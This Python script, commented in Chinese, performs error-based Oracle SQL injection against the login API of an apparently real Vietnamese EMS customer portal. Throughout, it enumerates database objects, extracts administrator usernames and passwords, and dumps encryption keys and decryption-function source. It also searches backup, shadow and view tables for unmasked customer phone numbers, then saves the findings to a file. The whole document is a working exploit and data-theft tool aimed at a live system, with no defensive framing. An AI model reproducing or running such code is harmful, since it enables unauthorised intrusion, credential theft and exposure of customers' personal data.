#!/usr/bin/env python3
"""
系统化分析：寻找不脱敏数据的所有途径
1. 登录系统分析
2. 加密解密函数
3. 密钥和算法
4. 权限和角色
5. 原始数据表
"""
import requests, urllib3, json
urllib3.disable_warnings()

url = 'https://customerconnect.ems.com.vn/api/User_Customer/Login'

def sqli(q):
    p = {'Username': f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,({q})))||'", 'Password': 'test'}
    try:
        r = requests.post(url, json=p, verify=False, timeout=25)
        if 'thesaurus' in r.text:
            s = r.text.find('thesaurus ') + 10
            e = r.text.find(' does not', s)
            if e > s: return r.text[s:e]
    except: pass
    return None

print("=" * 90)
print("🔍 系统化分析：寻找不脱敏数据的所有途径")
print("=" * 90)

findings = {
    'login_systems': [],
    'decrypt_functions': [],
    'encryption_keys': [],
    'privilege_roles': [],
    'raw_data_tables': [],
    'api_endpoints': []
}

# ========== 1. 登录系统分析 ==========
print("\n[1] 🔐 登录系统/后台分析\n")

# 1.1 查找所有包含LOGIN/AUTH的表
print("  [1.1] 登录相关表:")
login_tables = ['USER_LOGIN', 'LOGIN_LOG', 'AUTH_LOG', 'SESSION', 'USER_SESSION', 
                'ADMIN_LOGIN', 'EMPLOYEE_LOGIN', 'WEB_USER', 'PORTAL_USER']

for table in login_tables:
    exists = sqli(f"SELECT COUNT(*) FROM ALL_TABLES WHERE TABLE_NAME='{table}' AND OWNER='EMS'")
    if exists == '1':
        count = sqli(f"SELECT COUNT(*) FROM EMS.{table}")
        print(f"    ✓ EMS.{table} ({count}条)")
        findings['login_systems'].append({'table': f'EMS.{table}', 'count': count})
        
        # 查看最近登录
        recent = sqli(f"SELECT USERNAME FROM (SELECT USERNAME FROM EMS.{table} ORDER BY LOGIN_DATE DESC) WHERE ROWNUM=1")
        if recent:
            print(f"      最近登录: {recent}")

# 1.2 查找角色/权限表
print("\n  [1.2] 角色权限表:")
role_tables = ['ROLE', 'USER_ROLE', 'PERMISSION', 'USER_PERMISSION', 'ACCESS_CONTROL']

for table in role_tables:
    exists = sqli(f"SELECT COUNT(*) FROM ALL_TABLES WHERE TABLE_NAME='{table}' AND OWNER='EMS'")
    if exists == '1':
        print(f"    ✓ EMS.{table}")
        
        # 查询管理员角色
        admin_role = sqli(f"SELECT ROLE_NAME FROM EMS.{table} WHERE ROLE_NAME LIKE '%ADMIN%' AND ROWNUM=1")
        if admin_role:
            print(f"      管理员角色: {admin_role}")
            
            # 查询这个角色的权限
            perms = sqli(f"SELECT PERMISSIONS FROM EMS.{table} WHERE ROLE_NAME='{admin_role}'")
            if perms:
                print(f"      权限: {perms}")

# 1.3 查找可能有完整数据访问权限的角色
print("\n  [1.3] 特殊权限用户:")

# 查询EMPLOYEE表中的高级别用户
for role in ['ADMIN', 'MANAGER', 'DBA', 'DEVELOPER', 'SUPERUSER']:
    user = sqli(f"SELECT USERNAME FROM EMS.EMPLOYEE WHERE ROLE='{role}' AND ROWNUM=1")
    if user:
        pwd = sqli(f"SELECT PASSWORD FROM EMS.EMPLOYEE WHERE USERNAME='{user}'")
        print(f"    {role}: {user} | PWD: {pwd}")
        findings['privilege_roles'].append({'role': role, 'user': user, 'password': pwd})

# ========== 2. 加密解密函数分析 ==========
print("\n[2] 🔓 加密解密函数分析\n")

# 2.1 查找所有包含DECRYPT/UNMASK/DECODE的函数
print("  [2.1] 解密相关函数:")

for i in range(1, 20):
    func = sqli(f"SELECT OBJECT_NAME FROM (SELECT OBJECT_NAME, ROWNUM AS RN FROM ALL_OBJECTS WHERE OBJECT_TYPE IN ('FUNCTION','PROCEDURE') AND OWNER='EMS' AND (OBJECT_NAME LIKE '%DECRYPT%' OR OBJECT_NAME LIKE '%UNMASK%' OR OBJECT_NAME LIKE '%DECODE%')) WHERE RN={i}")
    
    if func:
        print(f"    {i}. EMS.{func}")
        findings['decrypt_functions'].append(func)
        
        # 尝试查看函数源码
        source = sqli(f"SELECT TEXT FROM ALL_SOURCE WHERE NAME='{func}' AND OWNER='EMS' AND TYPE='FUNCTION' AND ROWNUM=1")
        if source:
            print(f"       源码片段: {source[:100]}...")

# 2.2 查找加密相关的包
print("\n  [2.2] 加密相关包:")

for i in range(1, 10):
    pkg = sqli(f"SELECT OBJECT_NAME FROM (SELECT OBJECT_NAME, ROWNUM AS RN FROM ALL_OBJECTS WHERE OBJECT_TYPE='PACKAGE' AND OWNER='EMS' AND (OBJECT_NAME LIKE '%CRYPT%' OR OBJECT_NAME LIKE '%SECUR%' OR OBJECT_NAME LIKE '%MASK%')) WHERE RN={i}")
    
    if pkg:
        print(f"    {i}. EMS.{pkg}")

# ========== 3. 密钥和加密参数 ==========
print("\n[3] 🔑 密钥和加密参数\n")

# 3.1 查找ID_KEY的用途（E1E2_PH_DECRYPT_DATA表有这个字段）
print("  [3.1] ID_KEY字段分析:")

# E1E2_PH_DECRYPT_DATA表的ID_KEY
key_sample = sqli("SELECT ID_KEY FROM EMS.E1E2_PH_DECRYPT_DATA WHERE ROWNUM=1")
print(f"    样本ID_KEY: {key_sample}")

# 在INFOR_KEY表查找对应的密钥
if key_sample:
    key_value = sqli(f"SELECT KEY FROM EMS.INFOR_KEY WHERE ID_KEY={key_sample}")
    print(f"    对应KEY值: {key_value}")
    
    if key_value:
        findings['encryption_keys'].append({'id_key': key_sample, 'key_value': key_value})

# 查看INFOR_KEY表所有密钥
print("\n  [3.2] INFOR_KEY表所有密钥:")
for i in range(1, 11):
    id_key = sqli(f"SELECT ID_KEY FROM (SELECT ID_KEY, ROWNUM AS RN FROM EMS.INFOR_KEY) WHERE RN={i}")
    if id_key:
        key_val = sqli(f"SELECT KEY FROM EMS.INFOR_KEY WHERE ID_KEY={id_key}")
        created = sqli(f"SELECT CREATEDDATE FROM EMS.INFOR_KEY WHERE ID_KEY={id_key}")
        print(f"    {i}. ID={id_key} | KEY={key_val} | Created={created}")

# 3.2 查找加密算法配置
print("\n  [3.3] 加密算法配置:")

config_keys = ['ENCRYPTION_ALGORITHM', 'MASK_ALGORITHM', 'PHONE_MASK_TYPE', 
               'DECRYPT_METHOD', 'ENCRYPTION_TYPE', 'CIPHER_TYPE']

for key in config_keys:
    val = sqli(f"SELECT CONFIG_VALUE FROM EMS.CONFIG WHERE CONFIG_KEY='{key}'")
    if val and 'ORA-' not in str(val):
        print(f"    {key}: {val}")

# ========== 4. 原始数据表搜索 ==========
print("\n[4] 📊 原始/备份数据表搜索\n")

# 4.1 查找可能的原始表
print("  [4.1] 可能的原始数据表:")

raw_patterns = ['%_ORIGINAL', '%_RAW', '%_SOURCE', '%_BACKUP', '%_ARCHIVE', 
                '%_MASTER', '%_FULL', '%_COMPLETE', '%_UNMASKED']

for pattern in raw_patterns:
    for i in range(1, 3):
        table = sqli(f"SELECT TABLE_NAME FROM (SELECT TABLE_NAME, ROWNUM AS RN FROM ALL_TABLES WHERE TABLE_NAME LIKE '{pattern}' AND OWNER='EMS') WHERE RN={i}")
        
        if table:
            # 检查是否有PHONE列
            has_phone = sqli(f"SELECT COUNT(*) FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='{table}' AND OWNER='EMS' AND COLUMN_NAME LIKE '%PHONE%'")
            
            if has_phone and has_phone != '0':
                print(f"    ✓ EMS.{table}")
                findings['raw_data_tables'].append(f'EMS.{table}')
                
                # 查询电话样本
                phone = sqli(f"SELECT RECEIVER_PHONE FROM EMS.{table} WHERE ROWNUM=1")
                if phone:
                    is_masked = 'xxxxx' in phone or '+++++' in phone
                    print(f"      电话样本: {phone} [{'脱敏' if is_masked else '完整'}]")

# 4.2 查找影子表/镜像表
print("\n  [4.2] 影子表/镜像表:")

for suffix in ['_SHADOW', '_MIRROR', '_COPY', '_REPLICA', '_TEMP', '_TMP']:
    table = f'SHIPMENT{suffix}'
    exists = sqli(f"SELECT COUNT(*) FROM ALL_TABLES WHERE TABLE_NAME='{table}' AND OWNER='EMS'")
    
    if exists == '1':
        print(f"    ✓ EMS.{table}")
        
        phone = sqli(f"SELECT RECEIVER_PHONE FROM EMS.{table} WHERE ROWNUM=1")
        if phone:
            is_masked = 'xxxxx' in phone or '+++++' in phone
            print(f"      电话: {phone} [{'脱敏' if is_masked else '完整'}]")

# ========== 5. API/接口分析 ==========
print("\n[5] 🌐 API接口分析\n")

# 5.1 查找API配置
print("  [5.1] API配置表:")

api_config_tables = ['API_CONFIG', 'API_ENDPOINT', 'WEB_SERVICE', 'REST_API']

for table in api_config_tables:
    exists = sqli(f"SELECT COUNT(*) FROM ALL_TABLES WHERE TABLE_NAME='{table}' AND OWNER='EMS'")
    if exists == '1':
        print(f"    ✓ EMS.{table}")
        
        # 查询API端点
        endpoint = sqli(f"SELECT ENDPOINT FROM EMS.{table} WHERE ROWNUM=1")
        if endpoint:
            print(f"      端点: {endpoint}")

# 5.2 查找可能返回完整数据的API
print("\n  [5.2] 可能返回完整数据的API:")

# 查询LOG_API表，看看有什么API调用
for i in range(1, 6):
    api_name = sqli(f"SELECT SERVICE_NAME FROM (SELECT DISTINCT SERVICE_NAME, ROWNUM AS RN FROM EMS.LOG_API) WHERE RN={i}")
    if api_name:
        print(f"    {i}. {api_name}")
        findings['api_endpoints'].append(api_name)

# ========== 6. 数据库触发器/视图 ==========
print("\n[6] 🔧 触发器/视图分析\n")

# 6.1 查找可能解密数据的触发器
print("  [6.1] SHIPMENT表的触发器:")

for i in range(1, 6):
    trigger = sqli(f"SELECT TRIGGER_NAME FROM (SELECT TRIGGER_NAME, ROWNUM AS RN FROM ALL_TRIGGERS WHERE TABLE_NAME='SHIPMENT' AND OWNER='EMS') WHERE RN={i}")
    
    if trigger:
        print(f"    {i}. {trigger}")
        
        # 查看触发器类型
        trigger_type = sqli(f"SELECT TRIGGER_TYPE FROM ALL_TRIGGERS WHERE TRIGGER_NAME='{trigger}' AND OWNER='EMS'")
        print(f"       类型: {trigger_type}")

# 6.2 查找可能显示完整数据的视图
print("\n  [6.2] 可能的完整数据视图:")

view_patterns = ['%_FULL', '%_COMPLETE', '%_DETAIL', '%_ADMIN']

for pattern in view_patterns:
    view = sqli(f"SELECT VIEW_NAME FROM ALL_VIEWS WHERE VIEW_NAME LIKE '{pattern}' AND OWNER='EMS' AND ROWNUM=1")
    
    if view:
        print(f"    ✓ EMS.{view}")
        
        # 尝试查询
        phone = sqli(f"SELECT RECEIVER_PHONE FROM EMS.{view} WHERE ROWNUM=1")
        if phone:
            print(f"      电话: {phone}")

# 保存所有发现
with open('UNMASK_ANALYSIS.json', 'w') as f:
    json.dump(findings, f, indent=2)

print("\n" + "=" * 90)
print("💾 分析完成，结果已保存: UNMASK_ANALYSIS.json")
print("=" * 90)
